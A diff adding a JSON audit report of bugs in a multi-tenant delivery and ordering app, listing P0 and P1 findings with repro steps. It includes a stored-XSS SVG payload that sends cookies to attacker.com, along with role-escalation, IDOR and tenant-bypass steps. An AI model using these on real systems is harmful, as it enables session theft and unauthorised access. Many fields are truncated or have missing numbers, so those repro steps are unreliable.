@@ -1,0 +1,710 @@
+{
+  "generated": "2026-05-01",
+  "env": {
+    "url": "https://routeflowmobile-production.up.railway.app",
+    "api": "https://routeflowapi-production.up.railway.app/api/v1",
+    "tenant": "ux-audit-1777265477001"
+  },
+  "P0": [
+    {
+      "id": "RF-001",
+      "title": "`RouteRun` created with `tenantId: null`; driver cannot see dispatched runs",
+      "severity": "P0",
+      "surface": "mobile-driver",
+      "repro": "Authenticate as operator and call `POST /route-runs` to dispatch a new run. | Authenticate as the assigned driver and call `GET /route-runs/my-runs`. | Observe the run is absent from the response. | Inspect the `RouteRun` record directly in",
+      "expected": "A newly dispatched `RouteRun` should carry the correct `tenantId` and appear in the driver's `GET /route-runs/my-runs` response immediately after dispatch."
+    },
+    {
+      "id": "RF-002",
+      "title": "Frontend never connects to the Socket.IO gateway; all real-time infrastructure is dead code from the client",
+      "severity": "P0",
+      "surface": "mobile-driver",
+      "repro": "",
+      "expected": ""
+    },
+    {
+      "id": "RF-003",
+      "title": "`completeStop` accepts stops on SCHEDULED (never-started) runs",
+      "severity": "P0",
+      "surface": "api",
+      "repro": "Authenticate as operator and call `POST /route-runs` to create a run (status `SCHEDULED`). | Do NOT call `startRun` or otherwise advance the run to `IN_PROGRESS`. | Call `PATCH /route-runs/:runId/stops/:stopId/complete` with a stop ID from ",
+      "expected": "The API should reject a stop-completion request with `400 Bad Request` if the parent `RouteRun.status` is not `IN_PROGRESS`."
+    },
+    {
+      "id": "RF-073",
+      "title": "Any authenticated user can self-promote to OPERATOR role via mass assignment",
+      "severity": "P0",
+      "surface": "api",
+      "repro": "Log in as driver and decode the JWT to obtain `userId`. | Send `PATCH /users/{userId}` with body `{\"role\": \"OPERATOR\"}` — receive HTTP | | Log out and log back in — the new JWT contains `role: OPERATOR`. | Access operator-only endpoints — a",
+      "expected": "Only `TENANT_ADMIN` users should be able to modify another user's role. All other users' `PATCH /users/:id` requests should ignore the `role` field entirely."
+    },
+    {
+      "id": "RF-074",
+      "title": "`deleteCustomer()` silently hard-cascades all financial records — permanent data loss",
+      "severity": "P0",
+      "surface": "api",
+      "repro": "Create a customer with at least one PAID invoice and one DELIVERED order. | Call `DELETE /customers/:id`. | Reload the finance dashboard — AR total decreases, PAID records are gone, audit history is lost.",
+      "expected": "Deleting a customer with PAID invoices, DELIVERED orders, or transaction history should be blocked with a clear error. At minimum, a soft-delete (archive) should be offered rather than irreversible de"
+    },
+    {
+      "id": "RF-075",
+      "title": "`GET /uploads/*` has no authentication guard — all uploaded files are publicly accessible",
+      "severity": "P0",
+      "surface": "api",
+      "repro": "As an authenticated operator, upload a product image and note the returned URL. | Open an incognito browser window (not logged in). | Navigate to that URL — the file is served without requiring authentication.",
+      "expected": "All uploaded files should require authentication. Sensitive files (tax documents, POD signatures, customer data) should additionally require that the requesting user belongs to the same tenant as the "
+    },
+    {
+      "id": "RF-076",
+      "title": "SVG logo upload allowed and served inline → stored XSS",
+      "severity": "P0",
+      "surface": "mobile-buyer",
+      "repro": "Upload a file named `logo.svg` containing `<svg><script>document.location='https://attacker.com/?c='+document.cookie</script></svg>` via the logo upload endpoint. | Log in as any user on the affected tenant. | The dashboard logo loads — the",
+      "expected": "SVG uploads should either be blocked entirely or sanitized server-side before storage. Served SVG files should never execute embedded scripts in the browser."
+    },
+    {
+      "id": "RF-077",
+      "title": "Buyer and operator tokens share `localStorage` namespace — session stomping",
+      "severity": "P0",
+      "surface": "web-buyer",
+      "repro": "Open a browser with one tab logged in as buyer. | Open a second tab and log in as operator. | Wait ~30 seconds. | Return to the buyer tab — the buyer session is invalidated and the buyer must log in again.",
+      "expected": "Buyer and operator sessions should be completely isolated so that operating tabs from both roles simultaneously in the same browser does not invalidate either session."
+    },
+    {
+      "id": "RF-147",
+      "title": "`createInvoiceFromOrder()` stores `tenantId: null`; buyers see zero invoices",
+      "severity": "P0",
+      "surface": "web-buyer",
+      "repro": "As operator, create an invoice from a confirmed order via `POST /invoices/from-order/:orderId`. | As the buyer for that order, call `GET /buyer/invoices`. | Observe an empty array — the invoice is invisible. | Inspect the invoice record in ",
+      "expected": "Invoices created from orders via `POST /invoices/from-order/:orderId` should be stamped with the correct `tenantId` from the order context and appear in the buyer's `GET /buyer/invoices` list."
+    },
+    {
+      "id": "RF-157",
+      "title": "Stored XSS via SVG upload: product images and customer tax-documents",
+      "severity": "P0",
+      "surface": "web-buyer",
+      "repro": "`POST /api/v1/products/:id/images` multipart with a `.svg` file containing `<script>alert(1)</script>` → HTTP 201 → fetch the returned URL → browser executes the script.",
+      "expected": "SVG files should be rejected at the upload validation stage on all endpoints. Only safe raster image formats (JPEG, PNG, WEBP) should be accepted as product images or customer documents."
+    },
+    {
+      "id": "RF-176",
+      "title": "Missing `X-Tenant-Slug` header on login issues a `tenantId: null` JWT that bypasses tenant isolation",
+      "severity": "P0",
+      "surface": "api",
+      "repro": "`POST /api/v1/auth/login` with valid credentials and NO `X-Tenant-Slug` header → HTTP 200 → token with `tenantId: null` → `GET /products`, `GET /customers` → returns foreign tenant data.",
+      "expected": "`POST /auth/login` without the `X-Tenant-Slug` header should return HTTP 400 \"tenantCode is required.\" A JWT with `tenantId: null` should never be issued. The `forTenant()` scope should throw an excep"
+    },
+    {
+      "id": "RF-197",
+      "title": "DELETE /customers silently cascades to delete all linked orders",
+      "severity": "P0",
+      "surface": "web-op",
+      "repro": "As operator, create a customer and place at least one PENDING order for that customer. | `DELETE /customers/{customerId}` (or click Delete in the UI). | `GET /orders/{orderId}` → | The order is gone.",
+      "expected": "`DELETE /customers/:id` should return HTTP 400 \"Cannot delete customer with open orders\" when PENDING or CONFIRMED orders exist, with a list of blocking order IDs. OR implement soft-delete (set `statu"
+    },
+    {
+      "id": "RF-203",
+      "title": "SYSTEMIC: All \"Create\" forms show only a spinner and never render",
+      "severity": "P0",
+      "surface": "web-op",
+      "repro": "Log in as operator. | Navigate to any of: `/routes/create`, `/customers/create`, `/products/create`, `/invoices/create`. | Wait 30 seconds — only a spinner is visible. No form fields appear.",
+      "expected": "Navigating to `/routes/create`, `/customers/create`, `/products/create`, or `/invoices/create` displays a form with the appropriate input fields for creating that entity."
+    }
+  ],
+  "P1": [
+    {
+      "id": "RF-004",
+      "title": "Any authenticated driver can complete another driver's stop (missing authorization check)",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Authenticate as driver_A and obtain a stop ID belonging to driver_B's run. | Call `PATCH /route-runs/:runId/stops/:stopId/complete` using driver_A's JWT. | Observe HTTP 200 — the stop is marked COMPLETED under driver_A's name.",
+      "expected": "The API should return `403 Forbidden` when a driver attempts to complete a stop on a route run that is not assigned to them."
+    },
+    {
+      "id": "RF-005",
+      "title": "Non-atomic stop completion + payment: second call can fail silently",
+      "severity": "P1",
+      "surface": "mobile-driver",
+      "repro": "Open the driver app on a stop with a cash/card payment. | Using a network proxy (e.g., Charles), throttle/block traffic after the stop-complete call succeeds but before the payment call fires. | Submit the stop completion — observe the stop",
+      "expected": "Stop completion and payment recording should succeed or fail together atomically — a DELIVERED stop must always have an associated payment record."
+    },
+    {
+      "id": "RF-006",
+      "title": "$0 cash/card payment silently skipped; stop still marked DELIVERED",
+      "severity": "P1",
+      "surface": "mobile-driver",
+      "repro": "Authenticate as driver and navigate to a stop requiring payment. | Select \"Cash\" as the payment method. | Leave the collected amount at the default (0). | Tap Submit — observe the stop is marked DELIVERED and no error is shown. | Verify in ",
+      "expected": "When a driver selects Cash/Card/Cheque as the payment method, the app should require a non-zero collected amount before allowing submission, and show an inline validation error if the field is empty o"
+    },
+    {
+      "id": "RF-007",
+      "title": "Tab transition freeze: every bottom-nav tab unresponsive for 20–40 s",
+      "severity": "P1",
+      "surface": "web-op",
+      "repro": "Log in as operator on the production URL. | Click the Dispatch tab in the bottom navigation. | Observe the page freezes for 20–40 seconds before rendering. | Repeat for Warehouse tab — same freeze occurs.",
+      "expected": "Navigating to any bottom-nav tab should show a skeleton or loading indicator immediately and render the full content within 2–3 seconds, without freezing the UI."
+    },
+    {
+      "id": "RF-008",
+      "title": "Cron jobs run without per-tenant context: cross-tenant data access or daily silent crash",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Inspect the cron handler implementations in `order-templates.service.ts` and `recurring-invoices.service.ts`. | Confirm that no `AsyncLocalStorage` tenant context is set before calling `forTenant()`. | Trigger the cron manually and observe ",
+      "expected": "Each cron handler should process records strictly scoped to one tenant at a time, iterating over all active tenants with proper ALS context set for each, so no cross-tenant data is ever read or writte"
+    },
+    {
+      "id": "RF-009",
+      "title": "100% push notification failure: Expo proxy tokens sent to Firebase FCM directly",
+      "severity": "P1",
+      "surface": "mobile-driver",
+      "repro": "",
+      "expected": "Push notifications should be delivered to registered devices when order status changes, dispatch occurs, or other relevant events fire. The token registration table should persist valid tokens."
+    },
+    {
+      "id": "RF-010",
+      "title": "Credit note allows over-crediting against original invoice total, ignoring payments already made",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Create an invoice for $1,| | Record a confirmed payment of $600 against that invoice. | Create a credit note for $500 against the same invoice. | Observe HTTP 201 — the credit note is accepted despite payments + credit ($1,100) exceeding th",
+      "expected": "A credit note amount must not exceed the invoice's remaining unpaid balance (`invoice.total − sum(confirmed_payments)`). The API should return `400 Bad Request` if the proposed credit would exceed the"
+    },
+    {
+      "id": "RF-011",
+      "title": "Duplicate invoice creation from an order-linked original creates double-billing risk",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Create an order and generate an invoice from it via `POST /invoices/from-order/:orderId`. | Note the resulting invoice ID and its `orderId` field. | Call `POST /invoices/:id/duplicate` on that invoice. | Observe HTTP 201 — a second invoice ",
+      "expected": "Attempting to duplicate an order-linked invoice should be blocked with a `400 Bad Request` explaining that order-linked invoices cannot be duplicated."
+    },
+    {
+      "id": "RF-012",
+      "title": "Invoice update with discount/shippingFee change does not recalculate total",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Create a DRAFT invoice with a total of $| | Call `PATCH /invoices/:id` with `{ \"discount\": 50 }` and no `items` field. | Fetch the updated invoice — observe `total` is still $100, not $| ",
+      "expected": "Any change to `discount` or `shippingFee` on an invoice should immediately trigger a recalculation of `total` and `taxAmount`, ensuring the stored values always reflect the current fields."
+    },
+    {
+      "id": "RF-013",
+      "title": "Cart not cleared on logout: items visible to next user on shared device",
+      "severity": "P1",
+      "surface": "mobile-buyer",
+      "repro": "Log in as User A (buyer) and add items to the cart. | Log out from User A's session. | Log in as User B on the same device. | Open the cart — User A's items are still present.",
+      "expected": "Upon logout, all in-memory user state including cart contents should be cleared so that the next user who logs in starts with a clean session."
+    },
+    {
+      "id": "RF-014",
+      "title": "Order number duplicate race: MAX+1 with no unique constraint",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Fire `Promise.all([POST /orders, POST /orders])` with two valid payloads simultaneously. | Both return HTTP | | Inspect the `orderNumber` fields of both created orders — they may be identical.",
+      "expected": "Every order should receive a unique `orderNumber`. Concurrent order creation should never produce two orders with the same number."
+    },
+    {
+      "id": "RF-015",
+      "title": "Operator dispatch emits nothing to the driver (no WebSocket event, no push notification)",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Authenticate as operator and dispatch a run to a specific driver. | Monitor the driver's device for a push notification — none arrives. | Monitor WebSocket traffic on the driver's client — no event is received. | Confirm: `grep -n 'sendToDr",
+      "expected": "When an operator dispatches a route run, the assigned driver should immediately receive a push notification and/or a WebSocket event with the run details so they can begin navigation."
+    },
+    {
+      "id": "RF-016",
+      "title": "`routes.service.ts::completeStop()` never auto-completes the RouteRun; dispatch deadlock",
+      "severity": "P1",
+      "surface": "web-op",
+      "repro": "Dispatch a run with two stops via the operator web UI. | Complete both stops via the web UI (not the driver mobile app). | Attempt to dispatch a new run for the same route. | Observe an error indicating a run is already active. | Check `Rou",
+      "expected": "When the final stop on a route run is marked COMPLETED (via any code path), the parent `RouteRun.status` should automatically transition to `COMPLETED`, freeing the route for the next dispatch."
+    },
+    {
+      "id": "RF-017",
+      "title": "No stock check at order creation: buyers can order out-of-stock products",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Set a product's stock level to | | Fire `Promise.all([POST /buyer/orders, POST /buyer/orders])` simultaneously, each ordering 1 unit of that product. | Both return HTTP 201 — both orders are confirmed. | Inspect the product's stock — it has",
+      "expected": "Order creation should validate that sufficient stock exists for each line item and reject the order with a `422 Unprocessable Entity` if stock is insufficient. Concurrent orders should be serialized s"
+    },
+    {
+      "id": "RF-018",
+      "title": "No self-service password reset; operator reset sends no notification",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Log in as a buyer with no Google auth linked. | Navigate to the login screen and attempt to find a \"Forgot password\" option — none exists. | As an operator, call `POST /users/:id/reset-password` for that buyer. | Confirm the buyer receives ",
+      "expected": "Users should be able to self-service reset their password via an email-based flow. When an operator resets a user's password, the user should receive an immediate notification email informing them of "
+    },
+    {
+      "id": "RF-019",
+      "title": "`completeStop` double-submit race produces duplicate DeliveryMutation rows",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Send two simultaneous `PATCH /route-runs/:runId/stops/:stopId/complete` requests for the same stop. | Both return HTTP | | Inspect the `DeliveryMutation` table — two rows exist for the same stop, inflating accounting aggregates.",
+      "expected": "Completing the same stop twice concurrently should be idempotent — only one `DeliveryMutation` row should be created and the second request should return either a `409 Conflict` or a no-op `200`."
+    },
+    {
+      "id": "RF-078",
+      "title": "All uploaded files served without `Content-Disposition: attachment` header",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Upload any file (e.g., a PDF or SVG) via any upload endpoint. | Navigate to the returned file URL directly. | Observe the browser renders the file inline rather than prompting a download.",
+      "expected": "All uploaded files except safe raster images (JPEG, PNG, WEBP) should be served with `Content-Disposition: attachment` so browsers download them rather than rendering them inline."
+    },
+    {
+      "id": "RF-079",
+      "title": "`isTaxExempt` field stored on Customer but never applied to invoices or orders",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Set a customer's `isTaxExempt` flag to `true`. | Create an order for that customer. | Inspect the order's `taxAmount` — it reflects the tenant tax rate, not 0%.",
+      "expected": "When `Customer.isTaxExempt` is `true`, all orders and invoices for that customer should be created with 0% tax applied, in compliance with their tax-exempt status."
+    },
+    {
+      "id": "RF-080",
+      "title": "`bulkDeleteCustomers()` destroys InvoiceItem/OrderItem from PAID invoices",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Select two or more customers that have PAID invoices. | Execute a bulk delete operation via the API. | Observe all financial records, including PAID invoice items, are permanently destroyed.",
+      "expected": "Bulk-deleting customers with PAID invoices or DELIVERED orders should be blocked. No financial records should be permanently destroyed without explicit confirmation and authorization checks."
+    },
+    {
+      "id": "RF-081",
+      "title": "`GET /returns/:id` exposes any customer's return to any CUSTOMER role (IDOR)",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Log in as Buyer A and obtain Buyer B's return ID (e.g., from the operator portal or by enumeration). | Call `GET /returns/{buyerB-returnId}` with Buyer A's JWT. | Observe HTTP 200 with Buyer B's full return data.",
+      "expected": "A CUSTOMER-role user should only be able to view returns that belong to their own account. Attempting to view another customer's return should return `403 Forbidden` or `404 Not Found`."
+    },
+    {
+      "id": "RF-082",
+      "title": "`POST /returns/:id/cancel` has no ownership check for CUSTOMER role",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Log in as Buyer A and obtain Buyer B's active return ID. | Call `POST /returns/{buyerB-returnId}/cancel` with Buyer A's JWT. | Observe HTTP 200 — Buyer B's return is cancelled without authorization.",
+      "expected": "A CUSTOMER-role user should only be able to cancel their own returns. Cancelling another customer's return should be rejected with `403 Forbidden`."
+    },
+    {
+      "id": "RF-083",
+      "title": "`GET /customers/:id` returns full customer PII to DRIVER role",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Authenticate as a driver. | Enumerate customer IDs (or obtain one from a route assignment). | Call `GET /customers/{customerId}` with the driver JWT. | Observe full PII including email, balance, and credit terms in the response.",
+      "expected": "DRIVER-role requests to `GET /customers/:id` should return only delivery-relevant fields (name, delivery address, phone), stripping financial and contact PII that drivers have no business need to acce"
+    },
+    {
+      "id": "RF-084",
+      "title": "`vendor-bills.service.ts::receive()` has no idempotency guard — double-receive doubles stock",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Create a vendor bill with 5 units of Product A (stock currently 10). | Call `POST /vendor-bills/:id/receive` twice in rapid succession. | Inspect Product A's stock — it is 20 (stock doubled) instead of the correct | ",
+      "expected": "Calling `receive()` on an already-received bill should return `409 Conflict` and not modify any inventory records."
+    },
+    {
+      "id": "RF-085",
+      "title": "`voidBill()` does not reverse stock movements from `receive()` — phantom inventory",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Create a vendor bill for 10 units of Product A (stock: 5). | Call `POST /vendor-bills/:id/receive` — stock becomes | | Call `POST /vendor-bills/:id/void`. | Check Product A's stock — it is still 15, not | Phantom inventory of 10 units remai",
+      "expected": "Voiding a received vendor bill should reverse all stock movements created during `receive()`, restoring inventory to its pre-receipt level."
+    },
+    {
+      "id": "RF-086",
+      "title": "Buyer token expiry redirects to operator `/login` instead of `/customer-login`",
+      "severity": "P1",
+      "surface": "web-buyer",
+      "repro": "Log in as a buyer and let the session expire (or manually clear the buyer token). | Attempt any authenticated buyer action. | Observe the redirect goes to `/login` (operator form) rather than `/customer-login`.",
+      "expected": "When a buyer's session expires, they should be redirected to `/customer-login` — the buyer-specific login screen — not the operator login screen."
+    },
+    {
+      "id": "RF-087",
+      "title": "`/customer-login` redirected to operator home when operator session exists",
+      "severity": "P1",
+      "surface": "web-buyer",
+      "repro": "Log in as operator in a browser tab — `accessToken` is stored in localStorage. | Navigate to `/customer-login`. | Observe the redirect to `/home` — the buyer login page is inaccessible.",
+      "expected": "The top-level route guard on `/customer-login` should only check for `buyerAccessToken` — the presence of an operator `accessToken` should not redirect to the operator home."
+    },
+    {
+      "id": "RF-088",
+      "title": "Invoice detail shows infinite spinner on 401 — no error state, no escape",
+      "severity": "P1",
+      "surface": "web-buyer",
+      "repro": "Navigate to a buyer invoice detail page. | Invalidate the buyer session token (or wait for expiry). | Observe the page shows an infinite spinner with no error or navigation option.",
+      "expected": "A 401 response on the invoice detail page should display an error message like \"Please sign in again\" with a link to the buyer login page, allowing the user to recover without needing to use the brows"
+    },
+    {
+      "id": "RF-089",
+      "title": "\"Place Order\" button silently fails when buyer token is missing — no feedback",
+      "severity": "P1",
+      "surface": "web-buyer",
+      "repro": "Load the buyer checkout page. | Invalidate the buyer session token manually (remove from localStorage). | Click \"Place Order.\" | Observe nothing happens — no feedback of any kind.",
+      "expected": "Clicking \"Place Order\" with an expired session should redirect the buyer to the login page with a message like \"Your session expired. Please sign in to complete your order.\""
+    },
+    {
+      "id": "RF-090",
+      "title": "Settings Users tab entirely absent — no way to manage operator users from the UI",
+      "severity": "P1",
+      "surface": "web-op",
+      "repro": "Log in as operator and navigate to Settings. | Observe no Users tab exists. | Navigate directly to `/settings/users` — \"Page could not be found\" error.",
+      "expected": "Operators should be able to create, edit, delete, and manage user roles via a Users tab in the Settings screen — a standard capability for any multi-user SaaS product."
+    },
+    {
+      "id": "RF-091",
+      "title": "`canActAsDriver` toggle not exposed in any UI surface",
+      "severity": "P1",
+      "surface": "web-op",
+      "repro": "Log in as TENANT_ADMIN (`ux_admin`). | Navigate to Profile and Settings — no `canActAsDriver` toggle exists. | Observe no mode-switcher pill in the header.",
+      "expected": "TENANT_ADMIN users should be able to enable/disable dual-role (operator+driver) mode via a toggle in their profile or the Users tab. The mode-switcher pill should appear in the header when the flag is"
+    },
+    {
+      "id": "RF-092",
+      "title": "Offline queue unbounded growth and silent 4xx discard without user notification",
+      "severity": "P1",
+      "surface": "mobile-driver",
+      "repro": "",
+      "expected": "(a) The offline queue should have a maximum size cap and show a UI badge indicating queue depth. (b) Permanently discarded actions should appear in a \"failed syncs\" inbox with a persistent in-app noti"
+    },
+    {
+      "id": "RF-093",
+      "title": "`forcePasswordChange` flag not enforced at API layer — bypassable via direct API calls",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Set `user.forcePasswordChange = true` for a test user. | Log in as that user and obtain a JWT (the login succeeds). | Call any API endpoint directly with that JWT (e.g., `GET /orders`). | Observe HTTP 200 — the force-password-change restric",
+      "expected": "When `user.forcePasswordChange` is `true`, all API endpoints except `/auth/change-password` and `/auth/logout` should return `403 Forbidden` with `{\"code\":\"FORCE_PASSWORD_CHANGE\"}`, preventing any oth"
+    },
+    {
+      "id": "RF-094",
+      "title": "Buyer standing-orders API path returns 404",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Authenticate as a buyer with an active standing order template. | Call `GET /api/v1/buyer/standing-orders` with the buyer JWT. | Observe HTTP | ",
+      "expected": "`GET /buyer/standing-orders` should return the authenticated buyer's active standing order templates with HTTP 200."
+    },
+    {
+      "id": "RF-130",
+      "title": "Finance home is AP-only; no AR Aging dashboard exists",
+      "severity": "P1",
+      "surface": "web-op",
+      "repro": "Log in as operator and navigate to Finance. | Observe the home screen shows only vendor bills, expenses, and supplier metrics. | Navigate to More > Insights > Analytics — only Revenue, Top Items, and Margins are available; no AR Aging.",
+      "expected": "The Finance screen should include an AR Aging report that buckets outstanding invoice balances into Current, 1–30, 31–60, 61–90, and 90+ day ranges, allowing operators to prioritize collections and id"
+    },
+    {
+      "id": "RF-134",
+      "title": "No \"Mark paid\" transition for vendor bills; lifecycle terminates at Received",
+      "severity": "P1",
+      "surface": "web-op",
+      "repro": "Create a vendor bill and mark it as Received. | View the bill detail — no \"Mark paid\" button is present. | Navigate to Finance > Vendor Bills > Paid tab — \"No bills yet\" always displays.",
+      "expected": "A Received vendor bill should have a \"Mark paid\" button that transitions it to Paid status, records a payment date and reference, and removes it from the outstanding AP balance. The \"Paid\" filter tab "
+    },
+    {
+      "id": "RF-135",
+      "title": "Expenses have no status-change actions; all expenses stuck at Pending",
+      "severity": "P1",
+      "surface": "web-op",
+      "repro": "Create an expense via Finance > Expenses > New. | View the expense detail — only \"Edit\" and \"Delete expense\" buttons exist. | Click \"Edit\" — the form has no Status field. | Observe the expense remains \"Pending\" with no path to \"Paid\" or \"Vo",
+      "expected": "Expense detail should include \"Mark paid\" and \"Void\" action buttons that allow operators to progress expenses through their lifecycle (Pending → Paid or Pending → Void), reflecting actual payment or c"
+    },
+    {
+      "id": "RF-136",
+      "title": "Duplicate invoice entries in Overdue filter list",
+      "severity": "P1",
+      "surface": "web-op",
+      "repro": "Log in as operator and navigate to Finance > Invoices. | Apply the Overdue filter. | Observe INV-000422 appearing twice consecutively in the list.",
+      "expected": "Each invoice should appear exactly once in the Overdue filter list. No duplicate rows should be rendered regardless of how many payment or line-item records are associated with the invoice."
+    },
+    {
+      "id": "RF-141",
+      "title": "`bulkDeleteProducts()` destroys open order items and live invoice line items",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Via API, bulk-delete a set of products that includes one referenced by an open PENDING order — the order's line items are silently destroyed.",
+      "expected": "Bulk-deleting products should apply the same pre-deletion guard as single-product delete: if any selected product is referenced by an active order or open invoice, the entire bulk delete should be rej"
+    },
+    {
+      "id": "RF-158",
+      "title": "Negative product price accepted when submitted as string decimal",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Send `PATCH /products/:id` with `{\"pricePerUnit\": \"-| 00\"}` (string) — receive HTTP | | Create an order with that product — the order total is negative. | Generate an invoice from the order — the invoice shows a negative amount.",
+      "expected": "`PATCH /products/:id` with any negative price value (whether numeric or string) should return HTTP 400. All product prices must be non-negative."
+    },
+    {
+      "id": "RF-159",
+      "title": "`DELETE /customers/:id` permanently destroys the record with no confirmation and no soft-delete",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Authenticate as an operator. | Send `DELETE /customers/:id` with no additional parameters. | Receive HTTP 200 — the customer, all orders, and all invoices are permanently destroyed with no warning or audit entry.",
+      "expected": "Deleting a customer with financial history should be blocked with a 409 error. All deletion actions should require explicit confirmation and produce an audit log entry. A soft-delete (archive) should "
+    },
+    {
+      "id": "RF-160",
+      "title": "No rate limiting on `POST /auth/login` — brute-force is unrestricted",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Send 15 rapid `POST /auth/login` requests with a known username and incorrect passwords. | All 15 return HTTP 401 immediately — no throttling, no lockout, no delay.",
+      "expected": "After 5 failed login attempts from the same IP within 15 minutes, the login endpoint should return `429 Too Many Requests` and require a waiting period or CAPTCHA before further attempts."
+    },
+    {
+      "id": "RF-167",
+      "title": "`GET /route-runs/my-runs` returns 404 for all drivers regardless of assignment state",
+      "severity": "P1",
+      "surface": "mobile-driver",
+      "repro": "Authenticate as `ux_driver_a`. `GET /api/v1/route-runs/my-runs` → HTTP | Confirm driver has assigned runs via operator `GET /api/v1/route-runs` → both runs with `driverId` matching the driver exist and are SCHEDULED/IN_PROGRESS.",
+      "expected": "`GET /route-runs/my-runs` should return all runs assigned to the authenticated driver that are in SCHEDULED or IN_PROGRESS status, with HTTP 200."
+    },
+    {
+      "id": "RF-168",
+      "title": "Stop completion does not consistently update CONFIRMED orders to DELIVERED",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Create a route run via an older code path (without delivery mutation records). | Mark a stop as COMPLETED via `POST /route-runs/:runId/stops/:stopId/complete`. | Inspect the orders on that stop — they remain in CONFIRMED status rather than ",
+      "expected": "Marking a stop as COMPLETED should unconditionally transition all orders on that stop from CONFIRMED to DELIVERED, regardless of whether the run was created via an old or new code path."
+    },
+    {
+      "id": "RF-172",
+      "title": "`POST /orders` upserts existing PENDING order instead of creating a new one",
+      "severity": "P1",
+      "surface": "api",
+      "repro": "Ensure a customer has a PENDING order. | Send `POST /orders` for that customer with different items. | Observe the response contains the same order ID as the existing PENDING order — no new order is created.",
+      "expected": "`POST /orders` should always create a new order, returning a new unique order ID, even if the customer has existing PENDING orders."
+    },
+    {
+      "id": "RF-180",
+      "title": "`GET /buyer/standing-orders` returns 404 — standing orders buyer portal is completely broken",
+      "severity": "P1",
+      "surface": "mobile-buyer",
+      "repro": "Authenticate as Buyer 4 who has an active standing order template. | Navigate to More > Standing Orders in the buyer portal. | The page shows \"No standing orders\" — calls `GET /buyer/standing-orders` → | ",
+      "expected": "`GET /buyer/standing-orders` should return the authenticated buyer's active standing order templates with HTTP 200, allowing buyers to view, pause, and manage their recurring orders."
+    },
+    {
+      "id": "RF-200",
+      "title": "GET /buyer/products returns no stock availability field: buyer UI cannot show OOS state",
+      "severity": "P1",
+      "surface": "mobile-buyer",
+      "repro": "Reduce a product's stock to 0 via operator inventory adjustment. | Call `GET /buyer/products` as a buyer. | Inspect any product in the response — no `inStock`, `currentStock`, or `stockStatus` field present. | The product appears identical ",
+      "expected": "`GET /buyer/products` returns an `inStock: boolean` or `stockStatus: \"IN_STOCK\" | \"LOW\" | \"OUT_OF_STOCK\"` field for each product. Out-of-stock items are visually distinguished (greyed out, \"Out of sto"
+    },
+    {
+      "id": "RF-204",
+      "title": "Invoice \"Voided\" tab sends `status=VOIDED` but database uses `VOID` — always returns 0 results",
+      "severity": "P1",
+      "surface": "web-op",
+      "repro": "Void at least one invoice as operator. | Click the \"Voided\" tab on the invoices list. | Tab shows 0 results. | Confirm: `GET /invoices?status=VOID` returns the voided invoices; `GET /invoices?status=VOIDED` returns | ",
+      "expected": "The \"Voided\" tab displays all invoices with `status = VOID`."
+    },
+    {
+      "id": "RF-205",
+      "title": "Route \"Optimize stops\" button navigates to /drivers instead of optimizing",
+      "severity": "P1",
+      "surface": "web-op",
+      "repro": "Navigate to any route detail page. | Click \"Optimize stops.\" | Browser navigates to `/drivers` page.",
+      "expected": "Clicking \"Optimize stops\" calls `POST /routes/:id/optimize`, shows a loading state, then refreshes the stop list with the optimized order — all on the same route detail page."
+    },
+    {
+      "id": "RF-211",
+      "title": "/drivers page immediately redirects to /routes: driver list inaccessible",
+      "severity": "P1",
+      "surface": "web-op",
+      "repro": "Log in as operator. | Navigate to `/drivers` — briefly sees driver list, then redirected to `/routes`. | Navigate to `/drivers/add` or `/drivers/[any-uuid]` — \"Unmatched Route\" error.",
+      "expected": "`/drivers` renders a list of drivers (name, status, vehicle, canActAsDriver). `/drivers/add` renders a create form. `/drivers/:id` renders driver detail with edit controls."
+    },
+    {
+      "id": "RF-212",
+      "title": "/returns list shows empty state despite approved returns in API",
+      "severity": "P1",
+      "surface": "web-op",
+      "repro": "Log in as operator. | Confirm `GET /returns` via API returns at least one APPROVED return record. | Navigate to `/returns` in the UI — \"No returns found.\" | Navigate to `/returns/[any-uuid]` — \"Unmatched Route\" error.",
+      "expected": "`/returns` displays all returns in the tenant. Each return is clickable and opens a detail view at `/returns/:id`."
+    },
+    {
+      "id": "RF-213",
+      "title": "Settings page missing Users, Branding, and Integrations tabs",
+      "severity": "P1",
+      "surface": "web-op",
+      "repro": "",
+      "expected": ""
+    },
+    {
+      "id": "RF-215",
+      "title": "POST /buyer/cart/items and GET /buyer/cart return 404: buyer cart completely broken",
+      "severity": "P1",
+      "surface": "mobile-buyer",
+      "repro": "Log in as buyer. | `POST /buyer/cart/items` with `{productId, qty: 1}` → | | `GET /buyer/cart` → | | Navigate to buyer catalog — no \"Add to Cart\" button on any product card.",
+      "expected": "`POST /buyer/cart/items` adds a product to the buyer's cart. `GET /buyer/cart` returns the current cart with line items, quantities, and totals. The buyer product catalog shows an \"Add to Cart\" button"
+    },
+    {
+      "id": "RF-216",
+      "title": "Buyer portal /invoices and /more pages render Orders list above their own content",
+      "severity": "P1",
+      "surface": "web-buyer",
+      "repro": "Log in as buyer. | Navigate to the Invoices tab — Orders list appears at the top. | Navigate to the More tab — Orders list appears at the top.",
+      "expected": "`/invoices` renders only the buyer's invoice list. `/more` renders only the More menu (profile, settings, sign out)."
+    },
+    {
+      "id": "RF-217",
